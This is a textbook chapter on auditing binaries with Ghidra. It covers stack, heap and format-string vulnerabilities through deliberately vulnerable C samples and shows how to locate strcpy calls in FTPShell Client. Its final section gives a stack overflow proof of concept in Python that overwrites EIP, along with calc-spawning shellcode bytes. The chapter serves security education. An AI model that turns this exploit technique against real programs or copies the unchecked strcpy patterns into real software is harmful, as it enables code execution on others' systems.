<html><head></head><body><div><p>&#13;
			<h1 id="_idParaDest-113"><a id="_idTextAnchor138"/><em class="italic">Chapter 8</em>: Auditing Program Binaries<a id="_idTextAnchor139"/></h1>&#13;
			<p>In this chapter, you will learn about auditing executable binary files. It consists of analyzing binary programs to identify their vulnerabilities. It is interesting for us because this is another common Ghidra use case. Furthermore, if you find an unknown vulnerability in a program, in most cases, you will be able to hack computers without needing to convince the user to perform some action via social engineering.</p>&#13;
			<p>You will walk through a review of the main memory corruption vulnerabilities (that is, integer overflows, buffer overflow, format strings, and so on) while approaching them with Ghidra. <a id="_idTextAnchor140"/><a id="_idTextAnchor141"/>Finally, you will learn how these vulnerabilities can be exploited in practice.</p>&#13;
			<p>We will cover the following topics in this chapter: </p>&#13;
			<ul>&#13;
				<li>Understanding memory corruption vulnerabilities</li>&#13;
				<li>Finding vulnerabilities using Ghidra</li>&#13;
				<li>Exploiting a simple stack-based buffer overflow</li>&#13;
			</ul>&#13;
			<h1 id="_idParaDest-114"><a id="_idTextAnchor142"/>Technical requirements </h1>&#13;
			<p>The requirements for this chapter are as follows:</p>&#13;
			<ul>&#13;
				<li>MinGW64 – GCC compiler support for Windows: <a href="https://mingw-w64.org/">https://mingw-w64.org/</a></li>&#13;
				<li>Olly Debugger 1.10 (OllyDBG) – A debugger for Microsoft Windows platforms. Other versions of OllyDBG do exist but this version is very stable and works well with x86 32-bit binaries: <a href="http://www.ollydbg.de/odbg110.zi">http://www.ollydbg.de/odbg110.zi</a>p</li>&#13;
				<li>FTPShell Client 6.7: A real-world application that makes use of the <code>strcpy</code> function: <a href="https://www.exploit-db.com/apps/40d5fda024c3fc287fc841f23998ec27-fa_ftp_setup.msi">https://www.exploit-db.com/apps/40d5fda024c3fc287fc841f23998ec27-fa_ftp_setup.msi</a></li>&#13;
			</ul>&#13;
			<p>The GitHub repository containing all the necessary code for this chapter: <a href="https://github.com/PacktPublishing/Ghidra-Software-Reverse-Engineering-for-Beginners/tree/master/Chapter08">https://github.com/PacktPublishing/Ghidra-Software-Reverse-Engineering-for-Beginners/tree/master/Chapter08</a></p>&#13;
			<p>Check out the following link to see the Code in Action video: <a href="https://bit.ly/3lP7hRa">https://bit.ly/3lP7hRa</a></p>&#13;
			<h1 id="_idParaDest-115"><a id="_idTextAnchor143"/>Understanding memory corruption vulnerabilities</h1>&#13;
			<p>There <a id="_idIndexMarker277"/>are a lot of types of software vulnerabilities. In an effort to categorize software weakness types, arose <a id="_idIndexMarker278"/>the <strong class="bold">Common Weakness Enumeration</strong> (<strong class="bold">CWE</strong>). If you want to know what kind of vulnerabilities exist, I recommend you check out the entire list, which you can find at <a href="https://cwe.mitre.org/data/index.html">https://cwe.mitre.org/data/index.html</a>. </p>&#13;
			<p>We will be focusing on memory corruption vulnerabilities. This kind of vulnerability happens when a program tries to access a memory region without having access privileges to it.</p>&#13;
			<p>These kinds of vulnerabilities are typical in the C/C++ programming languages because a programmer has direct memory access, allowing us to commit memory access mistakes. They are not possible in the Java programming language, which is considered a memory-safe programming language because its<a id="_idIndexMarker279"/> runtime error detection checks and prevents such errors, although the <strong class="bold">Java Virtual Machine</strong> (<strong class="bold">JVM</strong>) is also susceptible to memory corruption vulnerabilities (<a href="https://media.blackhat.com/bh-ad-11/Drake/bh-ad-11-Drake-Exploiting_Java_Memory_Corruption-WP.pdf">https://media.blackhat.com/bh-ad-11/Drake/bh-ad-11-Drake-Exploiting_Java_Memory_Corruption-WP.pdf</a>).</p>&#13;
			<p>Before addressing memory corruption vulnerabilities, we need to cover two memory allocation mechanisms: automatic memory allocation (which takes place on the stack of the program) and dynamic memory allocation (which takes place on the heap). There's static allocation as well, which we are going to omit for this book (which is performed in the C programming language via the <code>static</code> keyword, but is not relevant here).</p>&#13;
			<p>Next, we will cover buffer overflow, which causes memory corruption when trying to use more memory than is allocated. And finally, since more protection mechanisms are being developed to mitigate buffer overflows, we will cover format string vulnerabilities, which enable the leaking of program information, allowing confidential data to be seen, but also enable learning about program memory addresses, making it possible to bypass some state-of-the-art memory corruption countermeasures.</p>&#13;
			<h2 id="_idParaDest-116"><a id="_idTextAnchor144"/>Understanding the stack</h2>&#13;
			<p>The stack of a <a id="_idIndexMarker280"/>computer works like a stack of plates. You can put plates onto the stack but, when removing plates, you can only remove the last plate put onto the stack. Let's see this with an example. The function <code>sum</code> (check line <code>00</code>) is supposed to perform the sum of its arguments, so the following code performs the operation <code>1 + 3</code> and stores the result in the <code>result</code> variable (check line <code>05</code>):</p>&#13;
			<pre>00 int sum(int a, int b){</pre>&#13;
			<pre>01    return a+b;</pre>&#13;
			<pre>02 }</pre>&#13;
			<pre>03 </pre>&#13;
			<pre>04 int main(int argc, char *argv[]) {</pre>&#13;
			<pre>05    int result = sum(1,3);</pre>&#13;
			<pre>06 }</pre>&#13;
			<p>Compile the previous code, targeting the x86 (32-bit) architecture:</p>&#13;
			<pre>C:\Users\virusito&gt;gcc –m32 –c sum.c –o sum.exe</pre>&#13;
			<pre>C:\Users\virusito&gt;</pre>&#13;
			<p>If we analyze the resulting binary using Ghidra, the line <code>05</code> is translated into the following assembly code lines:</p>&#13;
			<div>&#13;
				<div>&#13;
					<img src="img/B16207_08_001.jpg" alt="Figure 8.1 – Ghidra assembly overview of the sum function&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.1 – Ghidra assembly overview of the sum function</p>&#13;
			<p>A stack frame is a frame <a id="_idIndexMarker281"/>of data that gets pushed onto the stack. In the case of a call stack, a stack frame would represent a function call and its argument data. The current stack frame is located between the memory address stored in <code>ESP</code> (whose purpose is to point at the top of the stack) and <code>EBP</code> (whose purpose is to point at the base of the stack). As you can see, it pushes onto the stack the values <code>0x1</code> and <code>0x3</code> in reverse order regarding our code. It puts the integer <code>0x1</code> at the top of the stack (at the memory address pointed to by <code>ESP</code>) and also puts the integer <code>0x3</code> just before. The <code>_sum</code> function, corresponding to <code>sum</code> (check line <code>00</code>) in our code, is called and the result is expected to be returned in the <code>EAX</code> register, which is also stored on the stack using a <code>MOV</code> operation. Notice that when a <code>CALL</code> operation is performed, the address of the next instruction is pushed onto the stack and then it transfers the control to the callee function.</p>&#13;
			<p>In order to perform <a id="_idIndexMarker282"/>function calls, a convention is necessary to agree where the caller function places the parameters (into registers or onto the stack). If they are placed into registers, then the convention must specify which registers. It is also necessary to decide the order in which the parameters are placed. Who cleans the stack? The caller or the callee function? Where is the return value placed after returning from the function? As is evident, it is necessary to establish a calling convention.</p>&#13;
			<p>In this case, parameters are pushed onto the stack by the caller function, and the callee function, <code>_sum</code>, is responsible for clearing the stack and returning the value using the <code>EAX</code> register. This is <a id="_idIndexMarker283"/>called the <strong class="bold">cdecl</strong> convention, which<a id="_idIndexMarker284"/> stands for <strong class="bold">C declaration</strong>. </p>&#13;
			<p>Now, let's take a look at the <code>_sum</code> function:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_002.jpg" alt="Figure 8.2 – Program allowing you to sum numbers&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.2 – Program allowing you to sum numbers</p>&#13;
			<p>As you can see, the stack base address of the caller function is pushed onto the stack by the callee function via the <code>PUSH EBP</code> instruction (line <code>1</code>). Next, the <code>MOV EBP, ESP</code> instruction (line <code>2</code>) establishes that the top of the stack of the caller (the address stored in <code>ESP</code>) is the bottom of the callee function. In other words, the stack frame of the callee function is over the stack frame of the caller function.</p>&#13;
			<p>In this case, there is no stack allocation, which is can be performed via the <code>SUB ESP, 0xXX</code> operation, where <code>0xXX</code> is the amount of stack memory to allocate.</p>&#13;
			<p>Both parameters, <code>a</code> and <code>b</code>, are taken from the stack and stored in registers. The <code>ADD</code> operation (line <code>5</code>) is responsible for summing both registers and storing the result in the <code>EAX</code> register.</p>&#13;
			<p>Finally, the <a id="_idIndexMarker285"/>stack frame of the caller function is restored via <code>POP EBP</code> (line <code>6</code>), and the control is transferred to the caller function via <code>RET</code> (line <code>7</code>), which takes the next instruction to execute stored on the stack by the <code>CALL</code> instruction of the caller, and transfers the execution to it.</p>&#13;
			<p>In conclusion, the stack memory is available until the function exits and it is not necessary to free it.</p>&#13;
			<h2 id="_idParaDest-117"><a id="_idTextAnchor145"/>Stack-based buffer overflow</h2>&#13;
			<p>A stack-based buffer overflow (CWE-121: <a href="https://cwe.mitre.org/data/definitions/121.html">https://cwe.mitre.org/data/definitions/121.html</a>) happens <a id="_idIndexMarker286"/>when a buffer allocated in the stack is overwritten beyond its limits.</p>&#13;
			<p>In the following example, we can see a program that reserves 10 bytes of memory (see line <code>01</code>) and then copies the first argument given to the program into this buffer (see line <code>02</code>). Finally, the program returns <code>0</code>, but this is not relevant in this case:</p>&#13;
			<pre>00 int main(int argc, char *argv[]) { </pre>&#13;
			<pre>01   char buffer[200];</pre>&#13;
			<pre>02   strcpy(buffer, argv[1]); </pre>&#13;
			<pre>03   return 0; </pre>&#13;
			<pre>04 }</pre>&#13;
			<p>Compile the program targeting the x86 (32-bit) architecture:</p>&#13;
			<pre>C:\Users\virusito&gt;gcc stack_overflow.c -o stack_overflow.exe –m32</pre>&#13;
			<pre>C:\Users\virusito&gt;</pre>&#13;
			<p>The vulnerability happens because there are no length checks over the argument to copy into the buffer. So, if more than 200 bytes are copied into the buffer via <code>_strcpy</code>, some stuff stored on the stack apart from the buffer variable will be overwritten. Let's take a look at it using Ghidra:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_003.jpg" alt="Figure 8.3 – A stack-based overflow on _strcpy&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.3 – A stack-based overflow on _strcpy</p>&#13;
			<p>As you can see, when the<a id="_idIndexMarker287"/> code is compiled, the buffer is located at <code>ESP + 0x18</code> and <code>ptr_source</code> is at <code>Stack[-0xec]</code>, meaning that the buffer length is <code>0xec - 0x18 = 212</code> bytes. So, the code of the binary file is different than the source code written in C since the buffer was expected to be 10 bytes in size. See the following screenshot of the Ghidra decompiler:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_004.jpg" alt="Figure 8.4 – A compiler optimization applied over the local buffer variable&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.4 – A compiler optimization applied over the local buffer variable</p>&#13;
			<p>The aforementioned <a id="_idIndexMarker288"/>difference between the source code and the binary file happens due to compiler optimization. Notice that modifications and vulnerabilities can also be introduced by the compiler (for example, the compiler tends to remove uses of the <code>memset</code> function during the optimization phase when the targeted buffer is not used after, so it is not safe to use <code>memset</code> for zeroing memory). </p>&#13;
			<h2 id="_idParaDest-118"><a id="_idTextAnchor146"/>Understanding the heap</h2>&#13;
			<p>Sometimes, the <a id="_idIndexMarker289"/>programmer doesn't know how much memory will be needed at runtime or maybe they need to store some information that must survive to the exit of the function. It is in these cases that the programmer uses functions like the <code>malloc()</code> C standard function to dynamically allocate memory.</p>&#13;
			<p>In this case, the memory is allocated by the operating system in a heap structure, and the programmer is responsible for freeing it, for instance, using the <code>free()</code> C standard function.</p>&#13;
			<p>If the programmer forgets to call the <code>free()</code> function, the memory resource will not be freed until the program finishes its execution (because modern operating systems are sufficiently smart to release the resource when the program finishes).</p>&#13;
			<h2 id="_idParaDest-119"><a id="_idTextAnchor147"/>Heap-based buffer overflow</h2>&#13;
			<p>A heap-based <a id="_idIndexMarker290"/>buffer overflow (CWE-122: <a href="https://cwe.mitre.org/data/definitions/122.html">https://cwe.mitre.org/data/definitions/122.html</a>) happens when a buffer allocated in the heap is overwritten beyond its limits.</p>&#13;
			<p>This vulnerability is very similar to a stack-based buffer overflow but, in this case, the buffer is explicitly allocated via some function such as <code>malloc()</code> performing a heap dynamic allocation of memory. Let's see an example of this vulnerability:</p>&#13;
			<pre>00 int main(int argc, char *argv[]) {</pre>&#13;
			<pre>01    char *buffer;</pre>&#13;
			<pre>02    buffer = malloc(10);</pre>&#13;
			<pre>03    strcpy(buffer, argv[1]);</pre>&#13;
			<pre>04    free(buffer);</pre>&#13;
			<pre>05    return 0;</pre>&#13;
			<pre>06 }</pre>&#13;
			<p>Compile the program targeting the x86 (32-bit) architecture:</p>&#13;
			<pre>C:\Users\virusito&gt;gcc heap_bof.c –o heap_bof.exe –m32</pre>&#13;
			<pre>C:\Users\virusito&gt;</pre>&#13;
			<p>This code is analogous to the stack-based buffer overflow but the vulnerability happens in the heap. As you can see on line <code>02</code>, <code>10</code> bytes of memory are allocated in the heap, and then, on line <code>03</code>, it is overwritten by the first argument of the program that is bigger than <code>10</code> bytes.</p>&#13;
			<p>Usually, heap-based buffer overflows are considered more difficult to exploit than stack-based buffer overflows because the exploitation requires understanding how the heap structure works, which is an operating system-dependent structure and, therefore, a more complex topic.</p>&#13;
			<p>Let's see how it looks on Ghidra:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_005.jpg" alt="Figure 8.5 – A heap-based overflow on _strcpy&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.5 – A heap-based overflow on _strcpy</p>&#13;
			<p>As you can see, the<a id="_idIndexMarker291"/> size passed to <code>_malloc</code> is <code>0xa</code>. No optimizations are performed by the compiler because it is a dynamic allocation. After the <code>malloc</code> allocation, the pointer to the buffer is stored, then a pointer to the vector of program arguments, <code>_Argv</code>, is retrieved and, since it contains an array of pointers (one <code>dword</code> per pointer), <code>0x4</code> is added to <code>EAX</code> in order to skip the first parameter (which is the name of the program) and go to the first argument.</p>&#13;
			<p>Next to it, the call to the insecure <code>_strcpy</code> function happens and, finally, the allocated buffer is released via <code>_free</code>.</p>&#13;
			<h2 id="_idParaDest-120"><a id="_idTextAnchor148"/>Format strings</h2>&#13;
			<p>A format string vulnerability (CWE-134: <a href="https://cwe.mitre.org/data/definitions/134.html">https://cwe.mitre.org/data/definitions/134.html</a>) happens <a id="_idIndexMarker292"/>when the program uses a function that accepts a format string from an external source. Check out the following code: </p>&#13;
			<pre>00 int main(int argc, char *argv[]) { </pre>&#13;
			<pre>01     char *string = argv[1];</pre>&#13;
			<pre>02     printf(string);</pre>&#13;
			<pre>03     return 0;</pre>&#13;
			<pre>04 } </pre>&#13;
			<p>Compile the program targeting the x86 (32-bit) architecture:</p>&#13;
			<pre>C:\Users\virusito&gt;gcc format_strings.c –o format_strings.exe –m32</pre>&#13;
			<pre>C:\Users\virusito&gt;</pre>&#13;
			<p>The first argument given to the program is assigned to the string pointer on line <code>01</code> and is passed directly to the <code>printf()</code> function, which prints a format string.</p>&#13;
			<p>You can use it not only to crash the program but also to retrieve information. For instance, you can use <code>%p</code> to retrieve information from the stack:</p>&#13;
			<pre>C:\Users\virusito\vulns&gt;format_strings.exe %p.%p.%p.%p.%p 00B515A7.0061FEA8.00401E5B.00401E00.00000000</pre>&#13;
			<p>These kinds of vulnerabilities are<a id="_idIndexMarker293"/> very important nowadays because they are helpful to bypass <strong class="bold">Address Space Layout Randomization</strong> (<strong class="bold">ASLR</strong>) anti-exploit protection. ASLR prevents the <a id="_idIndexMarker294"/>attacker from knowing the base address where the binary is loaded (and, therefore, any other address), making it hard to control the program flow but, for instance, if you leak the content of some address in memory using a format string vulnerability, you will be able to calculate the base address (or any arbitrary binary address) using offsets relative to the leaked data.</p>&#13;
			<p class="callout-heading">Format string attack</p>&#13;
			<p class="callout">If you want to learn more about the details on how to retrieve information using format strin<a id="_idTextAnchor149"/>gs and how to<a id="_idIndexMarker295"/> exploit it, check out the following OWASP URL: <a href="https://owasp.org/www-community/attacks/Format_string_attack">https://owasp.org/www-community/attacks/Format_string_attack</a></p>&#13;
			<p>The exploiting topic is broad. These are not the only existing types of memory-corruption vulnerabilities (that is, use after free, double free, integer overflow, off-by-one, and so on were not covered here), but we've covered the basics.</p>&#13;
			<p>Next, we will discuss how to manually look for vulnerabilities using Ghidra.</p>&#13;
			<h1 id="_idParaDest-121"><a id="_idTextAnchor150"/>Finding vulnerabilities using Ghidra</h1>&#13;
			<p>The vulnerabilities covered <a id="_idIndexMarker296"/>in the previous section are all related to<a id="_idIndexMarker297"/> unsafe C functions so, when looking for vulnerabilities, you can start checking whether the program makes use of any of them.</p>&#13;
			<p>After identifying an unsafe function, the next step is to check the parameters and/or previous checks over the parameters to determine whether the function is being used properly.</p>&#13;
			<p>In order to perform the experiment on a real-world application, please install FTPShell Client 6.7. The installation steps are the following:</p>&#13;
			<ol>&#13;
				<li>Download the installer and execute it: https://www.exploit-db.com/apps/40d5fda024c3fc287fc841f23998ec27-fa_ftp_setup.msi.</li>&#13;
				<li>Click on <strong class="bold">Next</strong> when the wizard menu appears:<div><img src="img/B16207_08_006.jpg" alt="Figure 8.6 – FTPShell Client 6 Setup Wizard&#13;&#10;"/></div><p class="figure-caption"> </p><p class="figure-caption">Figure 8.6 – FTPShell Client 6 Setup Wizard</p></li>&#13;
				<li>Accept the FTPShell Client license and click on <strong class="bold">Next</strong>:<div><img src="img/B16207_08_007.jpg" alt="Figure 8.7 – Accepting the FTPShell Client license&#13;&#10;"/></div><p class="figure-caption"> </p><p class="figure-caption">Figure 8.7 – Accepting the FTPShell Client license</p></li>&#13;
				<li>Choose the location where the program will be installed and click on <strong class="bold">Next</strong>:<div><img src="img/B16207_08_008.jpg" alt="Figure 8.8 – Choosing the FTPShell Client install location&#13;&#10;"/></div><p class="figure-caption"> </p><p class="figure-caption">Figure 8.8 – Choosing the FTPShell Client install location</p></li>&#13;
				<li>Proceed <a id="_idIndexMarker298"/>to install:<div><img src="img/B16207_08_009.jpg" alt="Figure 8.9 – Installing FTPShell Client&#13;&#10;"/></div></li>&#13;
			</ol>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.9 – Installing FTPShell Client</p>&#13;
			<p>After the installation <a id="_idIndexMarker299"/>process, you will find the principal binary of the program at the following location:</p>&#13;
			<pre>C:\Program Files (x86)\FTPShellClient\ftpshell.exe</pre>&#13;
			<p>To prepare the lab for our experiment of looking for vulnerable functions in <code>ftpshell.exe</code>, we will need to create a Ghidra project containing the <code>ftpshell.exe</code> binary. Follow these steps:</p>&#13;
			<ol>&#13;
				<li value="1"> Create a new Ghidra project with the name of <code>FtpShell</code>. The steps to create a Ghidra project were explained in <a href="B16207_01_Final_SK_ePub.xhtml#_idTextAnchor017"><em class="italic">Chapter 1</em></a>, <em class="italic">Getting Started with Ghidra</em>, in the <em class="italic">Creating a new Ghidra project</em> section.</li>&#13;
				<li>Add the <code>ftpshell.exe</code> binary to it. The steps to add a binary to a Ghidra project were explained in <a href="B16207_01_Final_SK_ePub.xhtml#_idTextAnchor017"><em class="italic">Chapter 1</em></a>, <em class="italic">Getting Started with Ghidra</em>, in the <em class="italic">Importing files to a Ghidra project</em> section:<div><img src="img/B16207_08_010.jpg" alt="Figure 8.10 – Resulting FTPShell Ghidra project&#13;&#10;"/></div><p class="figure-caption"> </p><p class="figure-caption">Figure 8.10 – Resulting FTPShell Ghidra project</p></li>&#13;
				<li>Analyze the file. The steps to analyze a Ghidra project were explained in <a href="B16207_01_Final_SK_ePub.xhtml#_idTextAnchor017"><em class="italic">Chapter 1</em></a>, <em class="italic">Getting Started with Ghidra</em>, in the <em class="italic">Performing and configuring Ghidra analysis</em> section.</li>&#13;
			</ol>&#13;
			<p>Some functions that you can look for are the following:</p>&#13;
			<ul>&#13;
				<li>Some functions that can lead to stack-based buffer overflow vulnerabilities: <code>strcpy</code>, <code>strcat</code>, <code>strncat</code>, <code>gets()</code>, <code>memcpy()</code>.</li>&#13;
				<li>Some functions that can lead to heap-based buffer overflow vulnerabilities: <code>malloc()</code>, <code>calloc()</code>, <code>resize()</code>, <code>free()</code>.</li>&#13;
				<li>Some functions that can lead to format string vulnerabilities: <code>prinft()</code>, <code>fprintf()</code>, <code>sprintf()</code>, <code>snprintf()</code>, <code>vsprintf()</code>, <code>vprintf()</code>, <code>vsnprintf()</code>, <code>vfprintf()</code>.</li>&#13;
			</ul>&#13;
			<p>You can apply a<a id="_idIndexMarker300"/> filter to the <code>strcpy</code>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_011.jpg" alt="Figure 8.11 – Filtering functions to locate _strcpy&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.11 – Filtering functions to locate _strcpy</p>&#13;
			<p>Right-click on the results and click on <strong class="bold">Show References to Ctrl+Shift+F</strong> as shown in the following screenshot:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_012.jpg" alt="Figure 8.12 – Finding references to _strcpy&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.12 – Finding references to _strcpy</p>&#13;
			<p>Choosing the <a id="_idIndexMarker302"/>mentioned option will show you the list of program<a id="_idIndexMarker303"/> functions calling it:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_013.jpg" alt="Figure 8.13 – References to _strcpy&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.13 – References to _strcpy</p>&#13;
			<p>By disassembling the caller function, you can analyze whether the length checks applied to the string are sufficient to prevent exceeding the destination buffer length.</p>&#13;
			<p>In the following screenshot, you <a id="_idIndexMarker304"/>can see a call to <code>lstrlenA</code> in order to calculate the length of the source <a id="_idIndexMarker305"/>buffer and store the length in <code>iVar1</code>, following an <code>if</code> condition taking into account the value of <code>iVar1</code> and finally the unsafe function <code>lstrcpyA</code>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_014.jpg" alt="Figure 8.14 – Some length checks before the call to _strcpy&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.14 – Some length checks before the call to _strcpy</p>&#13;
			<p>A very efficient technique to find vulnerabilities is<a id="_idIndexMarker306"/> called <strong class="bold">fuzzing</strong>. It consists of monitoring the target application and sending data to it, expecting the program to crash for some given input.</p>&#13;
			<p>Finally, when the<a id="_idIndexMarker307"/> program crashes, you can start a debugging session <a id="_idIndexMarker308"/>on the target and analyze what happens when this input is given to the program. Ghidra can be a useful companion to your favorite debugger in this situation because you can rename variables and show the decompiled code, basically, offering support for issues that the debugger lacks.</p>&#13;
			<p>Fuzzing is very easy to understand but is a very complex topic because it is difficult to develop an efficient fuzzer. When developing a fuzzer, you have to choose whether it is better to generate program inputs from scratch or take an existing input (for example, a PDF file) and mutate it. If you decide to generate inputs, you will need to generate inputs that are likely to crash the program. On the other hand, if you mutate an existing input, you will need to guess what portions are likely to crash the program when being mutated. There is not currently a strong mathematical basis to make this decision, so it is hard and very empirical-based.</p>&#13;
			<h1 id="_idParaDest-122"><a id="_idTextAnchor151"/>Exploiting a simple stack-based buffer overflow</h1>&#13;
			<p>In this section, we <a id="_idIndexMarker309"/>will cover exploiting. It consists of writing a program or a script that takes advantage of a vulnerability.</p>&#13;
			<p>In this case, we will exploit our stack overflow sample application to execute arbitrary code on the system. The following code is what we want to exploit:</p>&#13;
			<pre>00 #include&lt;string.h&gt;</pre>&#13;
			<pre>01</pre>&#13;
			<pre>02 int main(int argc, char *argv[]) { </pre>&#13;
			<pre>03   char buffer[200];</pre>&#13;
			<pre>04   strcpy(buffer, argv[1]); </pre>&#13;
			<pre>05   return 0; </pre>&#13;
			<pre>06 }</pre>&#13;
			<p>Using the <code>–m32</code> flag of the MinGW64 compiler, we compile the code for the x86 architecture:</p>&#13;
			<pre>C:\Users\virusito\vulns&gt;gcc.exe stack_overflow.c -o stack_overflow.exe -m32</pre>&#13;
			<pre>:\Users\virusito\vulns&gt;</pre>&#13;
			<p>Now, we can check that it works correctly when the first argument is short:</p>&#13;
			<pre>C:\Users\virusito\vulns&gt;stack_overflow.exe AAAAAAAAAAAA</pre>&#13;
			<pre>:\Users\virusito\vulns&gt;</pre>&#13;
			<p>Now, we can check that it <a id="_idIndexMarker310"/>works correctly when the first argument is short but crashes when the argument is long because the stack overflow vulnerability is triggered:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_015.jpg" alt="Figure 8.15 – Triggering the overflow to cause Denial of Service (DoS)&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.15 – Triggering the overflow to cause Denial of Service (DoS)</p>&#13;
			<p>To exploit a stack overflow vulnerability, you will need to do two things:</p>&#13;
			<p>Take control of the program flow in order to redirect it to your malicious code (also known as the payload or shellcode).</p>&#13;
			<p>Inject the malicious code you wanted to execute (or reuse existing code).</p>&#13;
			<p>We know from the decompiled code of the binary that the buffer is 212 bytes in size, so we can write 212 characters without triggering the stack-based overflow:</p>&#13;
			<pre>payload = 'A'*212</pre>&#13;
			<p>Since <code>strcpy</code> uses the <code>cdecl</code> calling convention, <code>EBP</code> will be removed from the stack by the function, so 4 bytes will be removed from the stack:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_016.jpg" alt="Figure 8.16 – Ghidra identifying the cdecl calling convention for strcpy&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption">Figure 8.16 – Ghidra identifying the cdecl calling convention for strcpy</p>&#13;
			<p>We can adapt the payload by subtracting 4 bytes corresponding to <code>EBP</code> from our padding of A's and adding 4 bytes of B's to overwrite the return address:</p>&#13;
			<pre>payload  = 'A'*(212-4)</pre>&#13;
			<pre>payload += 'B'*4</pre>&#13;
			<p>If we continue overwriting, due<a id="_idIndexMarker311"/> to the <code>CALL</code> instruction executed by the caller, which places the address of the next instruction to execute onto the stack, we will be able to control the program flow, accomplishing our first goal. So, we will be able to overwrite the <code>EIP</code> register with an arbitrary value: </p>&#13;
			<pre>payload += 'C'*4</pre>&#13;
			<p>The<a id="_idIndexMarker312"/> complete <strong class="bold">Probe of Concept</strong> (<strong class="bold">PoC</strong>) Python code looks as follows:</p>&#13;
			<pre>import os</pre>&#13;
			<pre>payload  = 'A'*(212-4)</pre>&#13;
			<pre>payload += 'B'*4</pre>&#13;
			<pre>payload += 'C'*4</pre>&#13;
			<pre>os.system("stack_overflow.exe " + payload)</pre>&#13;
			<p>We can see that it works correctly because the <code>EPB</code> register was overwritten by <code>0x42424242</code>, which is the ASCII representation of <code>BBBB</code>, and the <code>EIP</code> register was also overwritten by <code>0x43434343</code>, which is the ASCII representation of <code>CCCC</code>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_017.jpg" alt="Figure 8.17 – Investigating the buffer overflow crash with a debugger&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.17 – Investigating the buffer overflow crash with a debugger</p>&#13;
			<p>Now, as the payload, I will use the<a id="_idIndexMarker313"/> following shellcode, which spawns a calculator:</p>&#13;
			<pre>shellcode = \</pre>&#13;
			<pre>"\x31\xC0\x50\x68\x63\x61\x6C\x63\x54\x59\x50\x40\x92\x74" \</pre>&#13;
			<pre>"\x15\x51\x64\x8B\x72\x2F\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B" \ "\x30\x8B\x7E\x18\xB2\x50\xEB\x1A\xB2\x60\x48\x29\xD4\x65" \</pre>&#13;
			<pre>"\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48" \ "\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B" \</pre>&#13;
			<pre>"\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17" \ "\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B" \</pre>&#13;
			<pre>"\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF" \</pre>&#13;
			<pre>"\xD7"</pre>&#13;
			<p>Please, never execute shellcode<a id="_idIndexMarker314"/> without knowing what it does. It could be malware. Instead, dump the shellcode to a file using the following:</p>&#13;
			<pre>with open("shellcode.bin", "wb") as file:</pre>&#13;
			<pre>    file.write(shellcode)</pre>&#13;
			<p>Import the resulting <code>shellcode.bin</code> fille to Ghidra, choosing an adequate language. In this case, the adequate assembly language is <strong class="bold">x86:LE:32:System Management Mode: default</strong>:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_018.jpg" alt="Figure 8.18 – Importing the shellcode to Ghidra&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.18 – Importing the shellcode to Ghidra</p>&#13;
			<p>Press the <em class="italic">D</em> key while focusing on the first byte of the shellcode:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_019.jpg" alt="Figure 8.19 – Converting shellcode bytes to code&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.19 – Converting shellcode bytes to code</p>&#13;
			<p>And try to understand what the<a id="_idIndexMarker315"/> shellcode is doing. In this case, it spawns a calculator:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_020.jpg" alt="Figure 8.20 – Analyzing the shellcode&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
